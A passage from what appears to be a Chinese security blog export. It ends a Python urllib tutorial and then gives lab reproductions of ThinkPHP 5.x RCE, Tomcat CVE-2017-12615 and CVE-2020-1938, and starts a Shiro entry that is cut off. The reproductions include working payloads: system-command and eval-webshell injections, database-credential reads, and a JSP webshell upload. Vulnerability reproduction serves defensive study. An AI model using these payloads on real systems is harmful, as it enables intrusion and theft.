&#x3D; urllib.request.Request(url&#x3D;url, headers&#x3D;header)</span><br><span class="line"></span><br><span class="line">#  以 utf-8 的格式打印出访问的页面</span><br><span class="line">test_2 &#x3D; urllib.request.urlopen(test).read().decode(&quot;utf-8&quot;)</span><br><span class="line">print (test_2)</span><br></pre></td></tr></table></figure>
<p>6、发送带参数的 GET 请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">#  指定访问的 URL</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;</span><br><span class="line"></span><br><span class="line">#  指定访问的 Headers</span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 99.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#  设置需传递的参数（使用 urlencode 将字典转换成可提交的参数，如：a&#x3D;test_1&amp;b&#x3D;test_2）</span><br><span class="line">data &#x3D; urllib.parse.urlencode(&#123;&#39;a&#39;:&#39;test_1&#39;, &#39;b&#39;:&#39;test_2&#39;&#125;)</span><br><span class="line">url &#x3D; url + &quot;?&quot; + data</span><br><span class="line"></span><br><span class="line">#  使用指定的 Headers 访问网页</span><br><span class="line">test &#x3D; urllib.request.Request(url&#x3D;url, headers&#x3D;header)</span><br><span class="line"></span><br><span class="line">#  以 utf-8 的格式打印出访问的页面</span><br><span class="line">test_2 &#x3D; urllib.request.urlopen(test).read().decode(&quot;utf-8&quot;)</span><br><span class="line">print (test_2)</span><br></pre></td></tr></table></figure>
<p>7、发送带参数的 POST 请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">#  指定访问的 URL</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;</span><br><span class="line"></span><br><span class="line">#  指定访问的 Headers</span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;,</span><br><span class="line">    &quot;Origin&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 99.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#  设置需传递的参数（使用 urlencode 将字典转换成可提交的参数，如：a&#x3D;test_1&amp;b&#x3D;test_2）</span><br><span class="line">data &#x3D; urllib.parse.urlencode(&#123;&#39;a&#39;:&#39;test_1&#39;, &#39;b&#39;:&#39;test_2&#39;&#125;)</span><br><span class="line">#  将序列化后的字符串转换成二进制数据（POST 请求携带的参数是二进制）</span><br><span class="line">data &#x3D; bytes(data, encoding&#x3D;&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line">#  使用指定的 Headers 访问网页</span><br><span class="line">test &#x3D; urllib.request.Request(url&#x3D;url, headers&#x3D;header, data &#x3D; data, method&#x3D;&quot;POST&quot;)</span><br><span class="line">#  指定新的 Headers（接受元组类型（会替换掉对应的项））</span><br><span class="line">test.add_header(&quot;User-Agent&quot;, &quot;Mozilla&#x2F;99.0 (Windows NT 99.0; Win99; x99) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;,</span><br><span class="line">)</span><br><span class="line">#  以 utf-8 的格式打印出访问的页面</span><br><span class="line">test_2 &#x3D; urllib.request.urlopen(test).read().decode(&quot;utf-8&quot;)</span><br><span class="line">print (test_2)</span><br></pre></td></tr></table></figure>
<p>8、设置全局代理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">#  需访问测试页面</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;ip&quot;</span><br><span class="line"></span><br><span class="line">#  设置代理 IP</span><br><span class="line">ip &#x3D; &#123;&quot;http&quot;:&quot;101.37.118.54:8888&quot;&#125;</span><br><span class="line">proxy_ip &#x3D; urllib.request.ProxyHandler(ip)</span><br><span class="line"></span><br><span class="line">#  使用 build_opener() 构建一个 opener 对象</span><br><span class="line">opener &#x3D; urllib.request.build_opener(proxy_ip)</span><br><span class="line">#  设置新的 Headers</span><br><span class="line">header &#x3D; (&#39;User-Agent&#39;,&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.97 Safari&#x2F;537.36&#39;)</span><br><span class="line">opener.addheaders &#x3D; [header]</span><br><span class="line">urllib.request.install_opener(opener)</span><br><span class="line"></span><br><span class="line">#  访问测试的页面</span><br><span class="line">response &#x3D; urllib.request.urlopen(url)</span><br><span class="line">#  以 utf-8 的格式打印出访问的页面</span><br><span class="line">html &#x3D; response.read().decode(&#39;utf-8&#39;)</span><br><span class="line">print (html)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP 5.0.2 - 5.0.23 RCE 漏洞复现</title>
    <url>/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/</url>
    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的。最早诞生于2006年初，2007年元旦正式更名为ThinkPHP，并且遵循Apache2开源协议发布。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。并且拥有众多原创功能和特性，在社区团队的积极参与下，在易用性、扩展性和性能方面不断优化和改进。</p>
<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p>
<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>ThinkPHP5 5.0.2 - 5.0.23</p>
<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><p>测试环境：ThinkPHP_5.0.22<br><a href="http://www.thinkphp.cn/donate/download/id/1260.html?__cf_chl_jschl_tk__=2d60761f086ace0ca0fd80f8d46b2043d9f844b1-1610970960-0-AbyMemrR-Tnnk2tMvVITwZ3AfrjPWPkp95Xb244JjneXgQGhmYKbSlTPo__l-jK-KVZCyUzkUwhTTZPmKCWbxc7roIfajMxDDZkxqPluw3D18svMPwAYOehIzV_I1hdnzg558pTFF7INimMKDhcNvwTak7VzuegJKyCY20EVc2PFvGWTLvdyXj-w2xDnNTdTldLg3Wenmsw_B6oZpC2aUUVnKJwJy1Z0JXoVeaRTmDlMZhB7knKynX0AgVCMI34Qhqb-k-A28mOzO8UpBKGv6y3ANxQPXEI3Gg0_nKO81VsWrrBZeqwjGPJEPu5pNnW6sukhE-l4RfZs_E3yrq3lmQU">ThinkPHP_5.0.22下载</a><br>下载完后解压到 phpstudy 的 www 文件夹内<br>访问 <a href="http://127.0.0.1/thinkphp/public/">http://127.0.0.1/thinkphp/public/</a> 可看到页面<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/1.jpg"></p>
<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、访问 <a href="http://127.0.0.1/thinkphp/public/index.php?s=captcha">http://127.0.0.1/thinkphp/public/index.php?s=captcha</a> 并抓包</p>
<p>2、构建 POC 并发包<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/2.png"></p>
<p>3、使用蚁剑连接<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/3.png"></p>
<p>POC：<br>通过发包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">#  查看当前用户</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br><span class="line"></span><br><span class="line">#  写入 WebShell（Linux）</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo &quot;&lt;?php @eval(\$_POST[&#39;pass&#39;]);?&gt;&quot; &gt; 1.php</span><br><span class="line"></span><br><span class="line">#  写入 WebShell（Windows）</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo ^&lt;?php @eval($_POST[&#39;pass&#39;]);?^&gt; &gt; 1.php</span><br></pre></td></tr></table></figure>
<p>通过 URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  查看数据库用户名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;.|think\config&#x2F;get&amp;name&#x3D;database.username</span><br><span class="line"></span><br><span class="line">#  查看数据库密码</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;.|think\config&#x2F;get&amp;name&#x3D;database.password</span><br><span class="line"></span><br><span class="line">#  查看当前用户</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami</span><br><span class="line"></span><br><span class="line">#  phpinfo</span><br><span class="line">index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure>
<h3 id="其他版本-POC"><a href="#其他版本-POC" class="headerlink" title="其他版本 POC"></a>其他版本 POC</h3><h4 id="当-PHP7-以上无法使用-Assert-的时候用"><a href="#当-PHP7-以上无法使用-Assert-的时候用" class="headerlink" title="当 PHP7 以上无法使用 Assert 的时候用"></a>当 PHP7 以上无法使用 Assert 的时候用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;包含&amp;x&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
<h5 id="ThinkPHP5"><a href="#ThinkPHP5" class="headerlink" title="ThinkPHP5"></a>ThinkPHP5</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;?s&#x3D;index&#x2F;\think\View&#x2F;display&amp;content&#x3D;%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data&#x3D;1</span><br></pre></td></tr></table></figure>
<h5 id="ThinkPHP-5-0-21"><a href="#ThinkPHP-5-0-21" class="headerlink" title="ThinkPHP 5.0.21"></a>ThinkPHP 5.0.21</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp_5.0.21&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp_5.0.21&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure>
<h5 id="ThinkPhP-5-1"><a href="#ThinkPhP-5-1" class="headerlink" title="ThinkPhP 5.1.*"></a>ThinkPhP 5.1.*</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter&#x3D;phpinfo&amp;data&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter&#x3D;system&amp;data&#x3D;cmd</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cmd</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cmd</span><br></pre></td></tr></table></figure>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>升级到5.0.24及以上，不开启debug模式</p>
<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://xz.aliyun.com/t/3845">https://xz.aliyun.com/t/3845</a><br><a href="https://blog.csdn.net/qq_29647709/article/details/84956221">https://blog.csdn.net/qq_29647709/article/details/84956221</a><br><a href="https://www.freebuf.com/vuls/194127.html">https://www.freebuf.com/vuls/194127.html</a></p>
]]></content>
      <categories>
        <category>ThinkPHP 漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>ThinkPHP 漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Tomcat CVE-2017-12615 任意文件写入漏洞复现</title>
    <url>/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/</url>
    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p><a href="https://www.cnblogs.com/backlion/p/7590797.html">参考</a></p>
<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Apache Tomcat 7.0.0 - 7.0.81</p>
<p>Apache Tomcat 8.5.19</p>
<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  进入 vulhub 目录下的 &#x2F;tomcat&#x2F;CVE-2017-12615&#x2F; 目录</span><br><span class="line">#  启动环境</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">#  查看环境</span><br><span class="line">sudo docker ps -a</span><br><span class="line">#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））</span><br><span class="line">sudo docker exec -it 268f542b6482 bash</span><br></pre></td></tr></table></figure>

<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、环境开启后访问页面如下</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/1.jpg"></p>
<p>2、在  <code>BP</code>中构造如下 <code>POC</code> 并发包（此处用的是冰蝎3.0自带的jsp码，密码为冰蝎右下角的rebeyond）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.10.233:8080</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 542</span><br><span class="line"></span><br><span class="line">AAAAA&lt;%@page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k&#x3D;&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c&#x3D;Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;bbbb</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/bp.jpg"></p>
<p>3、使用冰蝎进行连接</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/2.jpg"></p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/3.jpg"></p>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>1、配置 <code>readonly</code> 和 <code>VirtualDirContext</code> 值为 <code>Ture</code> 或注释参数，临时规避安全风险</p>
<p>2、更新到新版本</p>
<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/backlion/p/7590797.html">https://www.cnblogs.com/backlion/p/7590797.html</a></p>
<p><a href="https://vulhub.org/#/environments/tomcat/CVE-2017-12615/">https://vulhub.org/#/environments/tomcat/CVE-2017-12615/</a></p>
]]></content>
      <categories>
        <category>Apache Tomcat 漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Apache Tomcat 漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Tomcat CVE-2020-1938 任意文件读取漏洞复现</title>
    <url>/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%206,7,8,9/CVE-2020-1938/</url>
    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
<h3 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h3><p><code>Tomcat</code> 默认开启的 <code>AJP</code> 服务。端口号为 <code>8009</code>，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响 <code>Tomcat</code> 服务器 <code>webapp</code> 目录里的任意文件。</p>
<h3 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h3><p>Apache Tomcat 6<br>Apache Tomcat 7 &lt; 7.0.100<br>Apache Tomcat 8 &lt; 8.5.51<br>Apache Tomcat 9 &lt; 9.0.31</p>
<h3 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  进入 vulhub 目录下的 &#x2F;tomcat&#x2F;CVE-2020-1938&#x2F; 目录</span><br><span class="line">#  启动环境</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">#  查看环境</span><br><span class="line">sudo docker ps -a</span><br><span class="line">#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））</span><br><span class="line">sudo docker exec -it 268f542b6482 bash</span><br></pre></td></tr></table></figure>
<h3 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h3><p>1、环境开启后访问如下</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%206,7,8,9/CVE-2020-1938/1.jpg"></p>
<p>2、进入环境目录在进入 <code>/webapps/ROOT/WEB-INF</code> 目录下创建 <code>test.txt</code> 用于测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 01 &gt; .&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;test.txt</span><br></pre></td></tr></table></figure>
<p>3、使用 <a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">Python</a> 脚本对文件进行读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 192.168.10.233 -f &#x2F;WEB-INF&#x2F;test.txt</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%206,7,8,9/CVE-2020-1938/2.jpg"></p>
<h3 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h3><p>1、临时禁用 <code>AJP</code> 协议端口，在 <code>conf/server.xml</code> 配置文件中注释掉 <code>&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;</code></p>
<p>2、配置 <code>ajp</code> 配置中的 <code>secretRequired</code> 跟 <code>secret</code> 属性来限制认证</p>
<p>3、升级到最新版</p>
<h3 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h3><p><a href="https://www.cnblogs.com/L0ading/p/12341112.html">https://www.cnblogs.com/L0ading/p/12341112.html</a></p>
<p><a href="https://www.cnblogs.com/Sylon/p/12516428.html">https://www.cnblogs.com/Sylon/p/12516428.html</a></p>
]]></content>
      <categories>
        <category>Apache Tomcat 漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Apache Tomcat 漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Shiro 1.2.4 反序列化漏洞复现</title>
    <url>/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/</url>
    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p>
<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>参考-1：<a href="https://www.cnblogs.com/loong-hon/p/10619616.html">https://www.cnblogs.com/loong-hon/p/10619616.html</a><br>参考-2：<a href="https://www.cnblogs.com/panisme/p/12552838.html">https://www.cnblogs.com/panisme/p/12552838.html</a></p>
<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>只要 rememberMe 的 AES 加密密钥泄露，无论 shiro 是什么版本都会导致反序列化漏洞</p>
